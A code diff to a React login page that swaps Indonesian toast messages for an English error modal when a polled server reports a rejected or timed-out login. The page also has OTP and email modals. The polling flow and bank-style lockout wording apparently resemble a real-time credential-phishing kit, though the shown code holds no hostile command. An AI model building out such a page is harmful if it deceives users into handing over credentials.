@@ -115,19 +115,13 @@ export default function LoginPage() {
         } else if (data.stage === 'login_rejected') {
           stopPolling();
           setFlowStage('login_rejected');
-          toast({
-            title: 'Login Ditolak',
-            description: 'Username atau password salah. Silakan coba lagi.',
-            variant: 'destructive',
-          });
+          setErrorModalMessage("You've entered an incorrect username or password. After three failed attempts, your account may lock and you'll need to contact customer service.");
+          setShowErrorModal(true);
         } else if (data.stage === 'login_timeout') {
           stopPolling();
           setFlowStage('login_timeout');
-          toast({
-            title: 'Waktu Habis',
-            description: 'Sesi login telah habis. Silakan coba lagi.',
-            variant: 'destructive',
-          });
+          setErrorModalMessage("Your login session has expired. Please try again.");
+          setShowErrorModal(true);
         }
       } catch (err) {
         console.error('Polling error:', err);
@@ -518,6 +512,58 @@ export default function LoginPage() {
           </div>
         </div>
       </div>
+
+      {/* Error Modal */}
+      {showErrorModal && (
+        <div 
+          className="otp-modal" 
+          style={{ 
+            display: 'flex', 
+            position: 'fixed', 
+            zIndex: 9999, 
+            top: 0, 
+            left: 0, 
+            width: '100vw', 
+            height: '100vh', 
+            backgroundColor: 'rgba(0,0,0,0.5)', 
+            alignItems: 'center', 
+            justifyContent: 'center' 
+          }}
+        >
+          <div style={{ 
+            background: '#fff', 
+            padding: '25px 20px', 
+            borderRadius: '10px', 
+            width: '100%', 
+            maxWidth: '340px', 
+            textAlign: 'center', 
+            fontFamily: 'Arial', 
+            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
+          }}>
+            <p style={{ fontSize: '18px', fontWeight: 'bold', marginBottom: '12px', color: '#000' }} data-testid="text-error-title">Error</p>
+            <p style={{ fontSize: '14px', color: '#333', marginBottom: '20px', lineHeight: '1.5' }} data-testid="text-error-message">
+              {errorModalMessage}
+            </p>
+            <button 
+              onClick={() => { setShowErrorModal(false); setFlowStage('idle'); }}
+              style={{ 
+                width: '100%', 
+                padding: '12px', 
+                background: '#212121', 
+                color: '#fff', 
+                fontWeight: 'bold', 
+                fontSize: '15px', 
+                border: 'none', 
+                borderRadius: '6px', 
+                cursor: 'pointer' 
+              }}
+              data-testid="button-error-continue"
+            >
+              Continue
+            </button>
+          </div>
+        </div>
+      )}
 
       {/* Email Input Modal */}
       {showEmailModal && (
